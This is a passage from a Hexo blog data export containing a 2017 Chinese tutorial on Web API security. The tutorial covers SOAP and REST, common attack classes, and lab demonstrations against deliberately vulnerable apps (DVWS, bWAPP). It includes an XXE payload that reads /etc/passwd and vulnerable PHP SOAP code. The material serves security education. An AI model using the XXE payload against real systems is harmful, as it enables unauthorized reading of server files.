不知是否是因为使用了表格，而表格的转换导致布局混乱。</p>"},{"title":"Web API接口安全了解","date":"2017-07-11T06:55:22.000Z","_content":">   2017版OWASP top 10 将API安全纳入其中，足以说明API被广泛使用且安全问题严重。自己尝试整理一下，但限于本人搬砖经验还不足、水平有限，本文只能算是抛砖引玉，希望大伙不吝赐教。\n\n# 了解Web Service（API）\n    Web Service是一种跨编程语言和跨操作系统平台的远程调用技术。目前被广泛运用于移动端APP、物联网IoT、WEB应用等场景。\n\n<!-- more -->\n\n## 主流Web Service实现方式\n### SOAP/XML\n    简单对象访问协议(SOAP)接口，通过HTTP进行消息传输。它是基于xml语言开发，使用Web服务描述语言(WSDL)来进行接口描述。是一种很成熟的Web Service实现方式，整体上有被REST取代的趋势。\n\n### REST/JSON\n    表现层状态转移(REST),本质上讲的是一种ROA（Resource Oriented Architecture）架构风格。符合这种架构风格的API接口，我们称之为RESTful API。\n    PS: REST风格的接口既可以使用JSON，也可以使用XML，但由于JSON更加轻，故而基本不用XML。\nXML示例:\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n\t<person>\n\t\t<name>Jason</name>\n\t\t<age>99</age>\n\t\t<sex>male</sex>\n\t\t<contact>\n\t\t\t<mobile>13888888888</mobile>\n\t\t\t<email>bingo@tass.com.cn</email>\n\t\t\t<wechat>bingo</wechat>\n\t\t</contact>\n\t</person>\n```\nJSON示例:\n```\n{\n  \"person\": {\n    \"name\": \"Jason\",\n    \"age\": \"99\",\n    \"sex\": \"male\",\n    \"contact\": {\n      \"mobile\": \"13888888888\",\n      \"email\": \"bingo@tass.com.cn\",\n      \"wechat\": \"bingo\"\n    }\n  }\n}\n```\n\n# API安全\n\n## API的安全要素\n\n- 认证和鉴权 - 认证用户身份 & 确定用户权限\n\n    通常情况下，webAPI是基于HTTP协议的，也是无状态传输的。故而认证任务就需要我们自己实现，所以原则上每一次API请求都需要带上身份认证信息，通常使用的是API key。\n- 加密和签名 - 保证信息的保密性和完整性\n\n    通常使用SSL/TLS来加密通信消息，由API客户端发送和接收。签名用于确保API请求和响应在传输过程中未被篡改。\n\n- 漏洞 - 注入攻击 & 敏感数据泄露 & 越权访问\n\n## 攻击面检测\n- 尽可能多的了解API端点、消息、参数、行为。\n- 发现API中可能存在问题的元数据。\n- 记录流量进一步学习API\n- 爆破 - 暴力破解路径或资源\n\n## 攻击方式\n1.模糊测试\n\n    使用自动化工具并行的将大量的随机内容（各种可能的值或可能的攻击向量）作为输入参数进行长时间的尝试，并自动验证响应信息，确认是否获取到意外收获（系统或代码相关的信息）。\n2.注入攻击\n\n    使用SQL,XML,Xpath,JSON,JavaScript等的常见攻击向量尝试进行代码注入，并验证意外响应。\n3.无效/越界内容\n\n    尝试各种无效或者超范围的内容，并验证响应信息。\n4.恶意内容\n\n    在上传功能点尝试上传可执行文件或脚本等，使服务器尝试进行解析。\n5.XSS\n\n    上传常见攻击向量进行XSS（反射型，存储型等）测试。\n6.CSRF\n\n    测试API是否含有token，token是否能复用，是否可被伪造。\n7.不安全的直接对象引用\n\n    尝试对顺序化的id号进行越权访问，尝试访问无权限的方法或操作。\n8.其它考虑\n\n    会话认证（token是否正确使用）\n    安全配置（前述攻击照成系统/应用等信息泄露）\n\n# 攻击演示\n## 1. DVWS | WSDL Enumeration\n前端页面\n![](Web-API接口安全了解/screenshot01.png)\n\n源码中暴露wsdl文件\n![](Web-API接口安全了解/screenshot02.png)\n\nwsdl文件中可以查看到四种方法\n![](Web-API接口安全了解/screenshot03.png)\n\n使用READY!API（SOAPUI升级版）可以直观的看到4种方法并进行接口测试\n\n尝试使用check_user_information方法，尝试填入username（实际测试中可能需要结合爆破方式），接口返回了相关数据，从而导致数据泄露。\n![](Web-API接口安全了解/screenshot04.png)\n\n## 2. DVWS | XML External Entity Processing\n\n提交正常请求:\n```\n<name>Mr.Bingo</name>\n```\n\n![](Web-API接口安全了解/screenshot21.png)\n提交payload:\n```\n<?xml version=\"1.0\"?> <!DOCTYPE bingo [  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><name>&xxe;</name>\n```\n![](Web-API接口安全了解/screenshot24.png)\n\n额外测试：\n\n![](Web-API接口安全了解/screenshot22.png)\n![](Web-API接口安全了解/screenshot23.png)\n\n## 3. DVWS | Server Side Request Forgery\n正常数据请求\n\n![](Web-API接口安全了解/screenshot31.png)\n篡改请求URL\n\n![](Web-API接口安全了解/screenshot32.png)\n\n## 4. DVWS | REST API SQL Injection\n正常请求资源：\n\n![](Web-API接口安全了解/screenshot41.png)\n\nSQL注入：\n\n![](Web-API接口安全了解/screenshot42.png)\n\n## 5. bWAPP | SQL Injection - Blind (WS/SOAP)\n由于在前端屏蔽了后端所采用的API接口功能，故而贴出部分源码以供参考\n```\n<?php\nif(isset($_REQUEST[\"title\"]))\n{   \n    // Includes the NuSOAP library\n    require_once(\"soap/nusoap.php\");\n\n    // Creates an instance of the soap_client class\n    $client = new nusoap_client(\"http://localhost/bWAPP/ws_soap.php\");\n\n    // Calls the SOAP function\n    $tickets_stock = $client->call(\"get_tickets_stock\", array(\"title\" => sqli($_REQUEST[\"title\"])));\n\n    echo \"We have <b>\" . $tickets_stock . \"</b> movie tickets available in our stock.\";\n}\n?>\n```\n![](Web-API接口安全了解/screenshot50.png)\n\n>   当前个人对API接口测试的理解尚比较粗浅。涉及到fuzz、加解密及其他复杂的场景尚且无法拿出好的案例及测试平台。后续有机会再行补充，另外，希望有货的大佬们能多多分享。\n\n# 参考资料\n## 测试工具\n- Ready!API ( SoapUI )\n- Burpsuite\n- FuzzAPI\n## 测试平台\n\n- DVWS  [https://github.com/snoopythesecuritydog/dvws](https://github.com/snoopythesecuritydog/dvws)\n\n- bWAPP [https://sourceforge.net/projects/bwapp/](https://sourceforge.net/projects/bwapp/)\n\n- Hackazon  [https://github.com/rapid7/hackazon](https://github.com/rapid7/hackazon)\n\n    Web Version [http://hackazon.webscantest.com](http://hackazon.webscantest.com)\n- Mutillidae    [https://sourceforge.net/projects/mutillidae/](https://sourceforge.net/projects/mutillidae/)\n\n- Juice-shop    [https://github.com/bkimminich/juice-shop](https://github.com/bkimminich/juice-shop)\n\n\n## 参考资料\n- OWASP Top 10 - 2017 RC1\n\n- REST API 安全设计指南 [http://www.freebuf.com/articles/web/82108.html](http://www.freebuf.com/articles/web/82108.html)\n\n- REST Security Cheat Sheet [https://www.owasp.org/index.php/REST_Security_Cheat_Sheet](https://www.owasp.org/index.php/REST_Security_Cheat_Sheet)","source":"_posts/Web-API接口安全了解.md","raw":"---\ntitle: Web API接口安全了解\ndate: 2017-07-11 14:55:22\ntags: 接口安全\n---\n>   2017版OWASP top 10 将API安全纳入其中，足以说明API被广泛使用且安全问题严重。自己尝试整理一下，但限于本人搬砖经验还不足、水平有限，本文只能算是抛砖引玉，希望大伙不吝赐教。\n\n# 了解Web Service（API）\n    Web Service是一种跨编程语言和跨操作系统平台的远程调用技术。目前被广泛运用于移动端APP、物联网IoT、WEB应用等场景。\n\n<!-- more -->\n\n## 主流Web Service实现方式\n### SOAP/XML\n    简单对象访问协议(SOAP)接口，通过HTTP进行消息传输。它是基于xml语言开发，使用Web服务描述语言(WSDL)来进行接口描述。是一种很成熟的Web Service实现方式，整体上有被REST取代的趋势。\n\n### REST/JSON\n    表现层状态转移(REST),本质上讲的是一种ROA（Resource Oriented Architecture）架构风格。符合这种架构风格的API接口，我们称之为RESTful API。\n    PS: REST风格的接口既可以使用JSON，也可以使用XML，但由于JSON更加轻，故而基本不用XML。\nXML示例:\n```\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n\t<person>\n\t\t<name>Jason</name>\n\t\t<age>99</age>\n\t\t<sex>male</sex>\n\t\t<contact>\n\t\t\t<mobile>13888888888</mobile>\n\t\t\t<email>bingo@tass.com.cn</email>\n\t\t\t<wechat>bingo</wechat>\n\t\t</contact>\n\t</person>\n```\nJSON示例:\n```\n{\n  \"person\": {\n    \"name\": \"Jason\",\n    \"age\": \"99\",\n    \"sex\": \"male\",\n    \"contact\": {\n      \"mobile\": \"13888888888\",\n      \"email\": \"bingo@tass.com.cn\",\n      \"wechat\": \"bingo\"\n    }\n  }\n}\n```\n\n# API安全\n\n## API的安全要素\n\n- 认证和鉴权 - 认证用户身份 & 确定用户权限\n\n    通常情况下，webAPI是基于HTTP协议的，也是无状态传输的。故而认证任务就需要我们自己实现，所以原则上每一次API请求都需要带上身份认证信息，通常使用的是API key。\n- 加密和签名 - 保证信息的保密性和完整性\n\n    通常使用SSL/TLS来加密通信消息，由API客户端发送和接收。签名用于确保API请求和响应在传输过程中未被篡改。\n\n- 漏洞 - 注入攻击 & 敏感数据泄露 & 越权访问\n\n## 攻击面检测\n- 尽可能多的了解API端点、消息、参数、行为。\n- 发现API中可能存在问题的元数据。\n- 记录流量进一步学习API\n- 爆破 - 暴力破解路径或资源\n\n## 攻击方式\n1.模糊测试\n\n    使用自动化工具并行的将大量的随机内容（各种可能的值或可能的攻击向量）作为输入参数进行长时间的尝试，并自动验证响应信息，确认是否获取到意外收获（系统或代码相关的信息）。\n2.注入攻击\n\n    使用SQL,XML,Xpath,JSON,JavaScript等的常见攻击向量尝试进行代码注入，并验证意外响应。\n3.无效/越界内容\n\n    尝试各种无效或者超范围的内容，并验证响应信息。\n4.恶意内容\n\n    在上传功能点尝试上传可执行文件或脚本等，使服务器尝试进行解析。\n5.XSS\n\n    上传常见攻击向量进行XSS（反射型，存储型等）测试。\n6.CSRF\n\n    测试API是否含有token，token是否能复用，是否可被伪造。\n7.不安全的直接对象引用\n\n    尝试对顺序化的id号进行越权访问，尝试访问无权限的方法或操作。\n8.其它考虑\n\n    会话认证（token是否正确使用）\n    安全配置（前述攻击照成系统/应用等信息泄露）\n\n# 攻击演示\n## 1. DVWS | WSDL Enumeration\n前端页面\n![](Web-API接口安全了解/screenshot01.png)\n\n源码中暴露wsdl文件\n![](Web-API接口安全了解/screenshot02.png)\n\nwsdl文件中可以查看到四种方法\n![](Web-API接口安全了解/screenshot03.png)\n\n使用READY!API（SOAPUI升级版）可以直观的看到4种方法并进行接口测试\n\n尝试使用check_user_information方法，尝试填入username（实际测试中可能需要结合爆破方式），接口返回了相关数据，从而导致数据泄露。\n![](Web-API接口安全了解/screenshot04.png)\n\n## 2. DVWS | XML External Entity Processing\n\n提交正常请求:\n```\n<name>Mr.Bingo</name>\n```\n\n![](Web-API接口安全了解/screenshot21.png)\n提交payload:\n```\n<?xml version=\"1.0\"?> <!DOCTYPE bingo [  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><name>&xxe;</name>\n```\n![](Web-API接口安全了解/screenshot24.png)\n\n额外测试：\n\n![](Web-API接口安全了解/screenshot22.png)\n![](Web-API接口安全了解/screenshot23.png)\n\n## 3. DVWS | Server Side Request Forgery\n正常数据请求\n\n![](Web-API接口安全了解/screenshot31.png)\n篡改请求URL\n\n![](Web-API接口安全了解/screenshot32.png)\n\n## 4. DVWS | REST API SQL Injection\n正常请求资源：\n\n![](Web-API接口安全了解/screenshot41.png)\n\nSQL注入：\n\n![](Web-API接口安全了解/screenshot42.png)\n\n## 5. bWAPP | SQL Injection - Blind (WS/SOAP)\n由于在前端屏蔽了后端所采用的API接口功能，故而贴出部分源码以供参考\n```\n<?php\nif(isset($_REQUEST[\"title\"]))\n{   \n    // Includes the NuSOAP library\n    require_once(\"soap/nusoap.php\");\n\n    // Creates an instance of the soap_client class\n    $client = new nusoap_client(\"http://localhost/bWAPP/ws_soap.php\");\n\n    // Calls the SOAP function\n    $tickets_stock = $client->call(\"get_tickets_stock\", array(\"title\" => sqli($_REQUEST[\"title\"])));\n\n    echo \"We have <b>\" . $tickets_stock . \"</b> movie tickets available in our stock.\";\n}\n?>\n```\n![](Web-API接口安全了解/screenshot50.png)\n\n>   当前个人对API接口测试的理解尚比较粗浅。涉及到fuzz、加解密及其他复杂的场景尚且无法拿出好的案例及测试平台。后续有机会再行补充，另外，希望有货的大佬们能多多分享。\n\n# 参考资料\n## 测试工具\n- Ready!API ( SoapUI )\n- Burpsuite\n- FuzzAPI\n## 测试平台\n\n- DVWS  [https://github.com/snoopythesecuritydog/dvws](https://github.com/snoopythesecuritydog/dvws)\n\n- bWAPP [https://sourceforge.net/projects/bwapp/](https://sourceforge.net/projects/bwapp/)\n\n- Hackazon  [https://github.com/rapid7/hackazon](https://github.com/rapid7/hackazon)\n\n    Web Version [http://hackazon.webscantest.com](http://hackazon.webscantest.com)\n- Mutillidae    [https://sourceforge.net/projects/mutillidae/](https://sourceforge.net/projects/mutillidae/)\n\n- Juice-shop    [https://github.com/bkimminich/juice-shop](https://github.com/bkimminich/juice-shop)\n\n\n## 参考资料\n- OWASP Top 10 - 2017 RC1\n\n- REST API 安全设计指南 [http://www.freebuf.com/articles/web/82108.html](http://www.freebuf.com/articles/web/82108.html)\n\n- REST Security Cheat Sheet [https://www.owasp.org/index.php/REST_Security_Cheat_Sheet](https://www.owasp.org/index.php/REST_Security_Cheat_Sheet)","slug":"Web-API接口安全了解","published":1,"updated":"2017-07-11T11:09:08.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj5lo6hsq000avquvoa7cmrip","content":"<blockquote>\n<p>  2017版OWASP top 10 将API安全纳入其中，足以说明API被广泛使用且安全问题严重。自己尝试整理一下，但限于本人搬砖经验还不足、水平有限，本文只能算是抛砖引玉，希望大伙不吝赐教。</p>\n</blockquote>\n<h1 id=\"了解Web-Service（API）\"><a href=\"#了解Web-Service（API）\" class=\"headerlink\" title=\"了解Web Service（API）\"></a>了解Web Service（API）</h1><pre><code>Web Service是一种跨编程语言和跨操作系统平台的远程调用技术。目前被广泛运用于移动端APP、物联网IoT、WEB应用等场景。\n</code></pre><a id=\"more\"></a>\n<h2 id=\"主流Web-Service实现方式\"><a href=\"#主流Web-Service实现方式\" class=\"headerlink\" title=\"主流Web Service实现方式\"></a>主流Web Service实现方式</h2><h3 id=\"SOAP-XML\"><a href=\"#SOAP-XML\" class=\"headerlink\" title=\"SOAP/XML\"></a>SOAP/XML</h3><pre><code>简单对象访问协议(SOAP)接口，通过HTTP进行消息传输。它是基于xml语言开发，使用Web服务描述语言(WSDL)来进行接口描述。是一种很成熟的Web Service实现方式，整体上有被REST取代的趋势。\n</code></pre><h3 id=\"REST-JSON\"><a href=\"#REST-JSON\" class=\"headerlink\" title=\"REST/JSON\"></a>REST/JSON</h3><pre><code>表现层状态转移(REST),本质上讲的是一种ROA（Resource Oriented Architecture）架构风格。符合这种架构风格的API接口，我们称之为RESTful API。\nPS: REST风格的接口既可以使用JSON，也可以使用XML，但由于JSON更加轻，故而基本不用XML。\n</code></pre><p>XML示例:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</div><div class=\"line\">\t&lt;person&gt;</div><div class=\"line\">\t\t&lt;name&gt;Jason&lt;/name&gt;</div><div class=\"line\">\t\t&lt;age&gt;99&lt;/age&gt;</div><div class=\"line\">\t\t&lt;sex&gt;male&lt;/sex&gt;</div><div class=\"line\">\t\t&lt;contact&gt;</div><div class=\"line\">\t\t\t&lt;mobile&gt;13888888888&lt;/mobile&gt;</div><div class=\"line\">\t\t\t&lt;email&gt;bingo@tass.com.cn&lt;/email&gt;</div><div class=\"line\">\t\t\t&lt;wechat&gt;bingo&lt;/wechat&gt;</div><div class=\"line\">\t\t&lt;/contact&gt;</div><div class=\"line\">\t&lt;/person&gt;</div></pre></td></tr></table></figure></p>\n<p>JSON示例:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">&#123;</div><div class=\"line\">  &quot;person&quot;: &#123;</div><div class=\"line\">    &quot;name&quot;: &quot;Jason&quot;,</div><div class=\"line\">    &quot;age&quot;: &quot;99&quot;,</div><div class=\"line\">    &quot;sex&quot;: &quot;male&quot;,</div><div class=\"line\">    &quot;contact&quot;: &#123;</div><div class=\"line\">      &quot;mobile&quot;: &quot;13888888888&quot;,</div><div class=\"line\">      &quot;email&quot;: &quot;bingo@tass.com.cn&quot;,</div><div class=\"line\">      &quot;wechat&quot;: &quot;bingo&quot;</div><div class=\"line\">    &#125;</div><div class=\"line\">  &#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h1 id=\"API安全\"><a href=\"#API安全\" class=\"headerlink\" title=\"API安全\"></a>API安全</h1><h2 id=\"API的安全要素\"><a href=\"#API的安全要素\" class=\"headerlink\" title=\"API的安全要素\"></a>API的安全要素</h2><ul>\n<li><p>认证和鉴权 - 认证用户身份 &amp; 确定用户权限</p>\n<p>  通常情况下，webAPI是基于HTTP协议的，也是无状态传输的。故而认证任务就需要我们自己实现，所以原则上每一次API请求都需要带上身份认证信息，通常使用的是API key。</p>\n</li>\n<li><p>加密和签名 - 保证信息的保密性和完整性</p>\n<p>  通常使用SSL/TLS来加密通信消息，由API客户端发送和接收。签名用于确保API请求和响应在传输过程中未被篡改。</p>\n</li>\n<li><p>漏洞 - 注入攻击 &amp; 敏感数据泄露 &amp; 越权访问</p>\n</li>\n</ul>\n<h2 id=\"攻击面检测\"><a href=\"#攻击面检测\" class=\"headerlink\" title=\"攻击面检测\"></a>攻击面检测</h2><ul>\n<li>尽可能多的了解API端点、消息、参数、行为。</li>\n<li>发现API中可能存在问题的元数据。</li>\n<li>记录流量进一步学习API</li>\n<li>爆破 - 暴力破解路径或资源</li>\n</ul>\n<h2 id=\"攻击方式\"><a href=\"#攻击方式\" class=\"headerlink\" title=\"攻击方式\"></a>攻击方式</h2><p>1.模糊测试</p>\n<pre><code>使用自动化工具并行的将大量的随机内容（各种可能的值或可能的攻击向量）作为输入参数进行长时间的尝试，并自动验证响应信息，确认是否获取到意外收获（系统或代码相关的信息）。\n</code></pre><p>2.注入攻击</p>\n<pre><code>使用SQL,XML,Xpath,JSON,JavaScript等的常见攻击向量尝试进行代码注入，并验证意外响应。\n</code></pre><p>3.无效/越界内容</p>\n<pre><code>尝试各种无效或者超范围的内容，并验证响应信息。\n</code></pre><p>4.恶意内容</p>\n<pre><code>在上传功能点尝试上传可执行文件或脚本等，使服务器尝试进行解析。\n</code></pre><p>5.XSS</p>\n<pre><code>上传常见攻击向量进行XSS（反射型，存储型等）测试。\n</code></pre><p>6.CSRF</p>\n<pre><code>测试API是否含有token，token是否能复用，是否可被伪造。\n</code></pre><p>7.不安全的直接对象引用</p>\n<pre><code>尝试对顺序化的id号进行越权访问，尝试访问无权限的方法或操作。\n</code></pre><p>8.其它考虑</p>\n<pre><code>会话认证（token是否正确使用）\n安全配置（前述攻击照成系统/应用等信息泄露）\n</code></pre><h1 id=\"攻击演示\"><a href=\"#攻击演示\" class=\"headerlink\" title=\"攻击演示\"></a>攻击演示</h1><h2 id=\"1-DVWS-WSDL-Enumeration\"><a href=\"#1-DVWS-WSDL-Enumeration\" class=\"headerlink\" title=\"1. DVWS | WSDL Enumeration\"></a>1. DVWS | WSDL Enumeration</h2><p>前端页面<br><img src=\"/2017/07/Web-API接口安全了解/screenshot01.png\" alt=\"\"></p>\n<p>源码中暴露wsdl文件<br><img src=\"/2017/07/Web-API接口安全了解/screenshot02.png\" alt=\"\"></p>\n<p>wsdl文件中可以查看到四种方法<br><img src=\"/2017/07/Web-API接口安全了解/screenshot03.png\" alt=\"\"></p>\n<p>使用READY!API（SOAPUI升级版）可以直观的看到4种方法并进行接口测试</p>\n<p>尝试使用check_user_information方法，尝试填入username（实际测试中可能需要结合爆破方式），接口返回了相关数据，从而导致数据泄露。<br><img src=\"/2017/07/Web-API接口安全了解/screenshot04.png\" alt=\"\"></p>\n<h2 id=\"2-DVWS-XML-External-Entity-Processing\"><a href=\"#2-DVWS-XML-External-Entity-Processing\" class=\"headerlink\" title=\"2. DVWS | XML External Entity Processing\"></a>2. DVWS | XML External Entity Processing</h2><p>提交正常请求:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;name&gt;Mr.Bingo&lt;/name&gt;</div></pre></td></tr></table></figure></p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot21.png\" alt=\"\"><br>提交payload:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE bingo [  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;</div></pre></td></tr></table></figure></p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot24.png\" alt=\"\"></p>\n<p>额外测试：</p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot22.png\" alt=\"\"><br><img src=\"/2017/07/Web-API接口安全了解/screenshot23.png\" alt=\"\"></p>\n<h2 id=\"3-DVWS-Server-Side-Request-Forgery\"><a href=\"#3-DVWS-Server-Side-Request-Forgery\" class=\"headerlink\" title=\"3. DVWS | Server Side Request Forgery\"></a>3. DVWS | Server Side Request Forgery</h2><p>正常数据请求</p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot31.png\" alt=\"\"><br>篡改请求URL</p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot32.png\" alt=\"\"></p>\n<h2 id=\"4-DVWS-REST-API-SQL-Injection\"><a href=\"#4-DVWS-REST-API-SQL-Injection\" class=\"headerlink\" title=\"4. DVWS | REST API SQL Injection\"></a>4. DVWS | REST API SQL Injection</h2><p>正常请求资源：</p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot41.png\" alt=\"\"></p>\n<p>SQL注入：</p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot42.png\" alt=\"\"></p>\n<h2 id=\"5-bWAPP-SQL-Injection-Blind-WS-SOAP\"><a href=\"#5-bWAPP-SQL-Injection-Blind-WS-SOAP\" class=\"headerlink\" title=\"5. bWAPP | SQL Injection - Blind (WS/SOAP)\"></a>5. bWAPP | SQL Injection - Blind (WS/SOAP)</h2><p>由于在前端屏蔽了后端所采用的API接口功能，故而贴出部分源码以供参考<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php</div><div class=\"line\">if(isset($_REQUEST[&quot;title&quot;]))</div><div class=\"line\">&#123;   </div><div class=\"line\">    // Includes the NuSOAP library</div><div class=\"line\">    require_once(&quot;soap/nusoap.php&quot;);</div><div class=\"line\"></div><div class=\"line\">    // Creates an instance of the soap_client class</div><div class=\"line\">    $client = new nusoap_client(&quot;http://localhost/bWAPP/ws_soap.php&quot;);</div><div class=\"line\"></div><div class=\"line\">    // Calls the SOAP function</div><div class=\"line\">    $tickets_stock = $client-&gt;call(&quot;get_tickets_stock&quot;, array(&quot;title&quot; =&gt; sqli($_REQUEST[&quot;title&quot;])));</div><div class=\"line\"></div><div class=\"line\">    echo &quot;We have &lt;b&gt;&quot; . $tickets_stock . &quot;&lt;/b&gt; movie tickets available in our stock.&quot;;</div><div class=\"line\">&#125;</div><div class=\"line\">?&gt;</div></pre></td></tr></table></figure></p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot50.png\" alt=\"\"></p>\n<blockquote>\n<p>  当前个人对API接口测试的理解尚比较粗浅。涉及到fuzz、加解密及其他复杂的场景尚且无法拿出好的案例及测试平台。后续有机会再行补充，另外，希望有货的大佬们能多多分享。</p>\n</blockquote>\n<h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><h2 id=\"测试工具\"><a href=\"#测试工具\" class=\"headerlink\" title=\"测试工具\"></a>测试工具</h2><ul>\n<li>Ready!API ( SoapUI )</li>\n<li>Burpsuite</li>\n<li><p>FuzzAPI</p>\n<h2 id=\"测试平台\"><a href=\"#测试平台\" class=\"headerlink\" title=\"测试平台\"></a>测试平台</h2></li>\n<li><p>DVWS  <a href=\"https://github.com/snoopythesecuritydog/dvws\" target=\"_blank\" rel=\"external\">https://github.com/snoopythesecuritydog/dvws</a></p>\n</li>\n<li><p>bWAPP <a href=\"https://sourceforge.net/projects/bwapp/\" target=\"_blank\" rel=\"external\">https://sourceforge.net/projects/bwapp/</a></p>\n</li>\n<li><p>Hackazon  <a href=\"https://github.com/rapid7/hackazon\" target=\"_blank\" rel=\"external\">https://github.com/rapid7/hackazon</a></p>\n<p>  Web Version <a href=\"http://hackazon.webscantest.com\" target=\"_blank\" rel=\"external\">http://hackazon.webscantest.com</a></p>\n</li>\n<li><p>Mutillidae    <a href=\"https://sourceforge.net/projects/mutillidae/\" target=\"_blank\" rel=\"external\">https://sourceforge.net/projects/mutillidae/</a></p>\n</li>\n<li><p>Juice-shop    <a href=\"https://github.com/bkimminich/juice-shop\" target=\"_blank\" rel=\"external\">https://github.com/bkimminich/juice-shop</a></p>\n</li>\n</ul>\n<h2 id=\"参考资料-1\"><a href=\"#参考资料-1\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><p>OWASP Top 10 - 2017 RC1</p>\n</li>\n<li><p>REST API 安全设计指南 <a href=\"http://www.freebuf.com/articles/web/82108.html\" target=\"_blank\" rel=\"external\">http://www.freebuf.com/articles/web/82108.html</a></p>\n</li>\n<li><p>REST Security Cheat Sheet <a href=\"https://www.owasp.org/index.php/REST_Security_Cheat_Sheet\" target=\"_blank\" rel=\"external\">https://www.owasp.org/index.php/REST_Security_Cheat_Sheet</a></p>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"<blockquote>\n<p>  2017版OWASP top 10 将API安全纳入其中，足以说明API被广泛使用且安全问题严重。自己尝试整理一下，但限于本人搬砖经验还不足、水平有限，本文只能算是抛砖引玉，希望大伙不吝赐教。</p>\n</blockquote>\n<h1 id=\"了解Web-Service（API）\"><a href=\"#了解Web-Service（API）\" class=\"headerlink\" title=\"了解Web Service（API）\"></a>了解Web Service（API）</h1><pre><code>Web Service是一种跨编程语言和跨操作系统平台的远程调用技术。目前被广泛运用于移动端APP、物联网IoT、WEB应用等场景。\n</code></pre>","more":"<h2 id=\"主流Web-Service实现方式\"><a href=\"#主流Web-Service实现方式\" class=\"headerlink\" title=\"主流Web Service实现方式\"></a>主流Web Service实现方式</h2><h3 id=\"SOAP-XML\"><a href=\"#SOAP-XML\" class=\"headerlink\" title=\"SOAP/XML\"></a>SOAP/XML</h3><pre><code>简单对象访问协议(SOAP)接口，通过HTTP进行消息传输。它是基于xml语言开发，使用Web服务描述语言(WSDL)来进行接口描述。是一种很成熟的Web Service实现方式，整体上有被REST取代的趋势。\n</code></pre><h3 id=\"REST-JSON\"><a href=\"#REST-JSON\" class=\"headerlink\" title=\"REST/JSON\"></a>REST/JSON</h3><pre><code>表现层状态转移(REST),本质上讲的是一种ROA（Resource Oriented Architecture）架构风格。符合这种架构风格的API接口，我们称之为RESTful API。\nPS: REST风格的接口既可以使用JSON，也可以使用XML，但由于JSON更加轻，故而基本不用XML。\n</code></pre><p>XML示例:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</div><div class=\"line\">\t&lt;person&gt;</div><div class=\"line\">\t\t&lt;name&gt;Jason&lt;/name&gt;</div><div class=\"line\">\t\t&lt;age&gt;99&lt;/age&gt;</div><div class=\"line\">\t\t&lt;sex&gt;male&lt;/sex&gt;</div><div class=\"line\">\t\t&lt;contact&gt;</div><div class=\"line\">\t\t\t&lt;mobile&gt;13888888888&lt;/mobile&gt;</div><div class=\"line\">\t\t\t&lt;email&gt;bingo@tass.com.cn&lt;/email&gt;</div><div class=\"line\">\t\t\t&lt;wechat&gt;bingo&lt;/wechat&gt;</div><div class=\"line\">\t\t&lt;/contact&gt;</div><div class=\"line\">\t&lt;/person&gt;</div></pre></td></tr></table></figure></p>\n<p>JSON示例:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">&#123;</div><div class=\"line\">  &quot;person&quot;: 